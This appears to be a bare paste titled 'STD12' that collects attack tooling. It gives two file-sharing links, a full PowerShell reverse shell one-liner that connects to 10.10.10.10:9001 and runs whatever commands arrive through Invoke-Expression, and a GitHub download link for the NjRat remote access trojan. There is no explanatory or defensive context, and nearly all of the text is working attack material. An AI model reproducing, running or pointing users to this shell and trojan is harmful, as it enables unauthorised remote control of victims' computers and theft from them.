# STD12

https://mega.nz/file/ZBBm1AzZ#UZlc3tf0eKNL-Kx14QuQHeo1HYA_C2ser-EYnOa36B8

$LHOST = "10.10.10.10"; $LPORT = 9001; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()


https://mega.nz/file/g6MhzRbQ#TOKndyfmToiVLcqcyN2VYRNniA463nEWzkJhXLb4e54

https://github.com/SebDevAO/NjRat-2.3D-Rat/releases/download/2.3.fix/NjRat.2.3D.Professional.Edition.zip
